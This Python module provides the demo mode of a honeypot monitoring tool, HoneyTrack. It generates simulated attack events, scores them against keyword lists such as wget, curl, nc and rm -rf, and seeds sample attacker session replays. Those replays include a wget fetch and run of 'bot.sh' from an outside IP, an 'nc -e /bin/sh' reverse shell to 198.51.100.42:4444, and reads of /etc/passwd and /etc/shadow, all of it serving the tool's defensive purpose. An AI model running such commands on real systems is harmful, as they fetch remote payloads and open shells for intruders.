"""
Demo Mode for HoneyTrack.

Generates realistic fake attack events every 1–4 seconds
using a pool of real IP addresses with known geolocation.
Useful for presentations and testing without a live VPS.

Usage:
    python main.py --demo
"""

import random
import time
import threading
import logging
from datetime import datetime

from config.settings import (
    DEMO_MIN_INTERVAL,
    DEMO_MAX_INTERVAL,
    DEMO_IP_POOL,
    DEMO_USERNAMES,
    DEMO_PASSWORDS,
    DEMO_COMMANDS,
    DEMO_USER_AGENTS,
    ALERT_RISK_THRESHOLD,
    EMAIL_ALERTS_ENABLED,
)
from database.database import SessionLocal
from database.repositories import save_event
from alerts.email_alerts import send_alert_email

logger = logging.getLogger(__name__)


# ──────────────────────────────────────────────────────
# Attack event generators
# ──────────────────────────────────────────────────────

SERVICES = ["SSH", "HTTP", "FTP"]

# Expanded global threat origin networks (Subnet prefix, Country, City, Base Lat, Base Lon, ISP, is_tor)
DEMO_SUBNET_POOL = [
    # North America
    ("198.51.100",  "United States", "Ashburn",        39.0438, -77.4874,  "Amazon AWS", False),
    ("142.250.190", "United States", "Mountain View",  37.4056, -122.0775, "Google LLC", False),
    ("104.244.42",  "United States", "San Francisco",  37.7749, -122.4194, "Cloudflare Inc", False),
    ("199.249.230", "United States", "Seattle",        47.6062, -122.3321, "Tor Exit - Calyx Institute", True),
    ("144.217.85",  "Canada",        "Montreal",       45.5017, -73.5673,  "OVH Canada", False),
    ("192.241.130", "United States", "New York",       40.7128, -74.0060,  "DigitalOcean LLC", False),

    # Europe
    ("185.220.101", "Germany",       "Frankfurt",      50.1109, 8.6821,    "Tor Exit Node", True),
    ("185.220.102", "Germany",       "Berlin",         52.5200, 13.4050,   "Tor Exit Node", True),
    ("45.155.205",  "Russia",        "Moscow",         55.7558, 37.6173,   "Red Bytes LLC", False),
    ("194.26.29",   "Russia",        "Saint Petersburg",59.9343, 30.3351,  "Selectel", False),
    ("141.98.11",   "Romania",       "Bucharest",      44.4268, 26.1025,   "Flokinet Ltd", False),
    ("5.188.206",   "Netherlands",   "Amsterdam",      52.3676, 4.9041,    "PIN DC", False),
    ("77.247.181",  "Netherlands",   "Amsterdam",      52.3676, 4.9041,    "Tor Exit - Privacy Hub", True),
    ("51.77.52",    "France",        "Roubaix",        50.6942, 3.1746,    "OVH SAS", False),
    ("185.100.86",  "Switzerland",   "Zurich",         47.3769, 8.5417,    "Init7 AG", False),
    ("89.238.176",  "United Kingdom","London",         51.5074, -0.1278,   "M247 Ltd", False),
    ("185.190.140", "Sweden",        "Stockholm",      59.3293, 18.0686,   "Bahnhof AB", False),
    ("195.154.122", "France",        "Paris",          48.8566, 2.3522,    "Scaleway", False),
    ("185.246.188", "Ukraine",       "Kyiv",           50.4501, 30.5234,   "FOP Kharytonov", False),
    ("109.70.100",  "Austria",       "Vienna",         48.2082, 16.3738,   "Tor Exit Node", True),

    # Asia & Middle East
    ("218.92.0",    "China",         "Nanjing",        32.0603, 118.7969,  "Chinanet", False),
    ("112.85.42",   "China",         "Hangzhou",       30.2741, 120.1551,  "China Telecom", False),
    ("61.177.172",  "China",         "Jiangsu",        32.9711, 119.4550,  "Chinanet Jiangsu", False),
    ("103.203.57",  "India",         "Mumbai",         19.0760, 72.8777,   "Cloudie Networks", False),
    ("117.211.88",  "India",         "Bengaluru",      12.9716, 77.5946,   "BSNL Internet", False),
    ("159.89.168",  "Singapore",     "Singapore",      1.3521,  103.8198,  "DigitalOcean SG", False),
    ("133.130.100", "Japan",         "Tokyo",          35.6762, 139.6503,  "GMO Internet", False),
    ("175.126.155", "South Korea",   "Seoul",          37.5665, 126.9780,  "KT Corp", False),
    ("118.69.135",  "Vietnam",       "Ho Chi Minh",    10.8231, 106.6297,  "FPT Telecom", False),
    ("182.253.180", "Indonesia",     "Jakarta",        -6.2088, 106.8456,  "PT Telkom", False),
    ("88.255.215",  "Turkey",        "Istanbul",       41.0082, 28.9784,   "Turk Telekom", False),
    ("94.200.120",  "United Arab Emirates", "Dubai",   25.2048, 55.2708,   "Du Telecom", False),

    # South America
    ("200.174.198", "Brazil",        "São Paulo",      -23.5505,-46.6333,  "Claro SA", False),
    ("189.112.35",  "Brazil",        "Rio de Janeiro", -22.9068,-43.1729,  "Vivo", False),
    ("190.210.100", "Argentina",     "Buenos Aires",   -34.6037,-58.3816,  "Telecom Argentina", False),
    ("186.104.88",  "Chile",         "Santiago",       -33.4489,-70.6693,  "Telefonica Chile", False),

    # Africa
    ("197.210.70",  "Nigeria",       "Lagos",          6.5244,  3.3792,    "MTN Nigeria", False),
    ("41.190.2",    "Kenya",         "Nairobi",        -1.2921, 36.8219,   "Safaricom", False),
    ("196.25.1",    "South Africa",  "Johannesburg",   -26.2041,28.0473,   "Telkom SA", False),
    ("197.14.150",  "Egypt",         "Cairo",          30.0444, 31.2357,   "Telecom Egypt", False),

    # Oceania
    ("139.130.4",   "Australia",     "Sydney",         -33.8688, 151.2093, "Telstra", False),
    ("103.246.248", "New Zealand",   "Auckland",       -36.8485, 174.7633, "Vodafone NZ", False),
]

_active_demo_ips = []  # In-memory history of generated unique IP objects

def _random_ip_info():
    """
    Generates realistic adversary IP telemetry.
    Dynamically introduces brand-new unique IPs (65% chance) so the Unique IPs metric
    steadily increases over time, while keeping repeat attackers (35%) to simulate
    sustained botnet brute-force campaigns.
    """
    global _active_demo_ips

    # 65% chance to discover a NEW unique IP, or 100% if the pool is still small (< 8)
    if random.random() < 0.65 or len(_active_demo_ips) < 8:
        prefix, country, city, lat, lon, isp, is_tor = random.choice(DEMO_SUBNET_POOL)
        host_ip = f"{prefix}.{random.randint(2, 254)}"
        
        # Ensure we don't repeat immediately if possible
        attempts = 0
        while any(item["source_ip"] == host_ip for item in _active_demo_ips) and attempts < 10:
            host_ip = f"{prefix}.{random.randint(2, 254)}"
            attempts += 1

        info = {
            "source_ip": host_ip,
            "country":   country,
            "city":      city,
            "latitude":  lat + random.uniform(-0.15, 0.15),
            "longitude": lon + random.uniform(-0.15, 0.15),
            "isp":       isp,
            "is_tor":    is_tor,
        }
        _active_demo_ips.append(info)
        if len(_active_demo_ips) > 500:
            _active_demo_ips.pop(0)
        return info
    else:
        # 35% chance of recurring attack from a known active adversary IP
        return random.choice(_active_demo_ips)


def _classify_demo(service, username, password, command, attempt_count):
    """Lightweight classification for demo events."""
    if command:
        cmd_lower = command.lower()
        exploit_indicators = {"wget", "curl", "nc", "netcat", "chmod", "bash -c", "nmap", "rm -rf"}
        for indicator in exploit_indicators:
            if indicator in cmd_lower:
                return "exploit_attempt"
        recon_commands = {"whoami", "id", "uname", "hostname", "pwd", "ls", "ifconfig", "ip addr"}
        if cmd_lower.strip() in recon_commands:
            return "recon"

    if attempt_count >= 5:
        return "brute_force"
    if username and attempt_count >= 3:
        return "credential_spray"

    return "credential_attempt"


def _score_demo(attack_type, username, password, command, is_tor):
    """Lightweight risk scoring for demo events."""
    base_scores = {
        "brute_force": 55,
        "credential_spray": 40,
        "exploit_attempt": 70,
        "recon": 25,
        "credential_attempt": 20,
    }
    score = base_scores.get(attack_type, 20)

    suspicious_users = {"root", "admin", "administrator"}
    if username and username.lower() in suspicious_users:
        score += 10

    common_passwords = {"123456", "password", "admin", "root", "qwerty", "12345678"}
    if password and password.lower() in common_passwords:
        score += 10

    if command:
        danger = {"wget", "curl", "chmod", "rm -rf", "cat /etc/passwd", "nmap", "nc "}
        for d in danger:
            if d in command.lower():
                score += 15
                break

    if is_tor:
        score += 10

    # Add some randomness (±5)
    score += random.randint(-5, 5)
    return min(max(score, 5), 100)


def generate_demo_event():
    """Generate a single realistic demo attack event."""
    ip_info = _random_ip_info()
    service = random.choice(SERVICES)

    username = random.choice(DEMO_USERNAMES)
    password = random.choice(DEMO_PASSWORDS)

    # SSH events more likely to have commands
    command = None
    if service == "SSH" and random.random() < 0.4:
        command = random.choice(DEMO_COMMANDS)

    # User agent only for HTTP
    user_agent = None
    if service == "HTTP":
        user_agent = random.choice(DEMO_USER_AGENTS)

    # Simulate attempt counts
    attempt_count = random.choices(
        [1, 2, 3, 5, 8, 12],
        weights=[30, 25, 15, 15, 10, 5],
        k=1
    )[0]

    # Some IPs are TOR exit nodes
    is_tor = ip_info.get("is_tor", False) or ("Tor" in ip_info["isp"]) or (random.random() < 0.08)

    attack_type = _classify_demo(service, username, password, command, attempt_count)
    risk_score = _score_demo(attack_type, username, password, command, is_tor)

    event_data = {
        "timestamp":   datetime.utcnow(),
        "source_ip":   ip_info["source_ip"],
        "service":     service,
        "username":    username,
        "password":    password,
        "command":     command,
        "user_agent":  user_agent,
        "country":     ip_info["country"],
        "city":        ip_info["city"],
        "isp":         ip_info["isp"],
        "latitude":    ip_info["latitude"],
        "longitude":   ip_info["longitude"],
        "attack_type": attack_type,
        "risk_score":  risk_score,
        "is_tor":      is_tor,
        "is_demo":     True,
    }

    return event_data


# ======================================================
# Demo runner
# ======================================================

_demo_running = False
_demo_thread = None
_alert_recipient_email = None

def set_alert_recipient(email):
    global _alert_recipient_email
    _alert_recipient_email = email

def start_demo_mode():
    """Start generating demo events in a background thread."""
    global _demo_running, _demo_thread

    if _demo_running:
        print("[DEMO] Demo mode is already running.")
        return

    seed_demo_session_replays()
    _demo_running = True
    _demo_thread = threading.Thread(target=_demo_loop, daemon=True)
    _demo_thread.start()
    print("[DEMO] " + "=" * 39)
    print("[DEMO]  Demo mode ACTIVE - generating attacks")
    print("[DEMO] " + "=" * 39)


def seed_demo_session_replays():
    """Seeds rich interactive terminal session recordings for playback in demo mode."""
    try:
        from sessions.session_recorder import create_sample_replay
        create_sample_replay(
            session_id="demo-session-recon-01",
            ip="185.220.101.35",
            username="root",
            commands=[
                ("whoami", "root"),
                ("id", "uid=0(root) gid=0(root) groups=0(root)"),
                ("uname -a", "Linux ubuntu-server 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"),
                ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"),
                ("cat /etc/shadow", "cat: /etc/shadow: Permission denied"),
                ("exit", "logout")
            ],
            is_demo=True
        )
        create_sample_replay(
            session_id="demo-session-malware-02",
            ip="45.155.205.233",
            username="ubuntu",
            commands=[
                ("whoami", "ubuntu"),
                ("pwd", "/home/ubuntu"),
                ("wget http://185.220.101.35/bot.sh", "Connecting to 185.220.101.35:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 14920 (14K) [application/x-sh]\nSaving to: 'bot.sh'\n\nbot.sh              100%[===================>]  14.57K  --.-KB/s    in 0.04s\n\n2026-10-04 10:20:00 (364 KB/s) - 'bot.sh' saved [14920/14920]"),
                ("chmod +x bot.sh", ""),
                ("./bot.sh", "Initializing payload...\n[CRITICAL] Sandbox anomaly detected. Aborting execution."),
                ("exit", "Connection closed.")
            ],
            is_demo=True
        )
        create_sample_replay(
            session_id="demo-session-revshell-03",
            ip="218.92.0.107",
            username="admin",
            commands=[
                ("uname -a", "Linux ubuntu-server 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"),
                ("nc -e /bin/sh 198.51.100.42 4444", "-bash: nc: command not found"),
                ("python3 -c 'import pty;pty.spawn(\"/bin/sh\")'", "$ whoami\nroot\n$ exit"),
                ("history", "    1  uname -a\n    2  nc -e /bin/sh 198.51.100.42 4444\n    3  exit"),
                ("exit", "logout")
            ],
            is_demo=True
        )
    except Exception as e:
        logger.error(f"[DEMO] Error seeding session replays: {e}")


def stop_demo_mode():
    """Stop the demo event generator."""
    global _demo_running
    _demo_running = False
    print("[DEMO] Demo mode stopped.")


def _demo_loop():
    """Main loop that generates demo events at random intervals."""
    global _demo_running
    event_count = 0

    while _demo_running:
        try:
            event_data = generate_demo_event()
            source_ip = event_data.get("source_ip")

            from defense.firewall import is_ip_blocked, check_and_auto_block
            if is_ip_blocked(source_ip):
                print(f"[DEMO/FIREWALL] Connection rejected: {source_ip} is blocked by HoneyTrack active defense.")
                interval = random.uniform(DEMO_MIN_INTERVAL, DEMO_MAX_INTERVAL)
                time.sleep(interval)
                continue

            # Evaluate auto-block threshold on high-risk intrusions
            check_and_auto_block(event_data)

            db = SessionLocal()
            try:
                event = save_event(db, event_data)
                event_count += 1

                # Format payload info
                payload_str = ""
                if event_data.get("command"):
                    payload_str = f"cmd:{event_data['command']}"
                elif event_data.get("user_agent"):
                    payload_str = f"ua:{event_data['user_agent'][:20]}..."
                else:
                    payload_str = f"{event_data['username']}:{event_data['password']}"

                coords_str = f"{event_data.get('latitude', 0):.2f},{event_data.get('longitude', 0):.2f}"
                city_str = event_data.get('city') or 'Unknown'
                isp_str = (event_data.get('isp') or 'Unknown')[:16]

                # Pretty-print all fields
                risk_bar = "#" * (event_data["risk_score"] // 10) + "-" * (10 - event_data["risk_score"] // 10)
                print(
                    f"[DEMO] #{event_count:>4} | "
                    f"{event_data['source_ip']:>15} | "
                    f"{event_data['service']:>4} | "
                    f"{city_str}, {event_data['country']} ({coords_str}) | "
                    f"{isp_str:<16} | "
                    f"{payload_str:<24} | "
                    f"Risk: {risk_bar} {event_data['risk_score']:>3}"
                )

                # Trigger email alert for high-risk events (using logged-in user or configured recipient)
                if EMAIL_ALERTS_ENABLED and event_data["risk_score"] >= ALERT_RISK_THRESHOLD:
                    logger.info(f"[DEMO] High risk event (score={event_data['risk_score']}) - triggering email alert")
                    threading.Thread(
                        target=send_alert_email,
                        args=(event_data, _alert_recipient_email),
                        daemon=True
                    ).start()

            finally:
                db.close()

        except Exception as e:
            print(f"[DEMO] Error generating event: {e}")

        # Sleep 1–4 seconds
        interval = random.uniform(DEMO_MIN_INTERVAL, DEMO_MAX_INTERVAL)
        time.sleep(interval)


if __name__ == "__main__":
    from database.database import init_db
    init_db()
    print("[DEMO] Starting standalone demo mode...")
    start_demo_mode()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_demo_mode()
        print("[DEMO] Stopped.")
